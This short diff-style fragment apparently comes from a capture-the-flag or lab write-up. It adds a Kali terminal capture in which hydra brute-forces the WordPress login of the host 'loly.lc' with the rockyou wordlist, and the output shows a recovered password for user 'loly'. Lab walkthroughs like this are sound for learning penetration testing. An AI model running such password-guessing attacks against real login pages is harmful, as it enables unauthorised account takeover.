@@ -1,0 +1,18 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# hydra -l loly -P /usr/share/wordlists/rockyou.txt loly.lc http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:incorrect" -V       
+...
+[80][http-post-form] host: loly.lc   login: loly   password: fernando
+1 of 1 target successfully completed, 1 valid password found
+
+
+
+
+
+
+
+
+
+
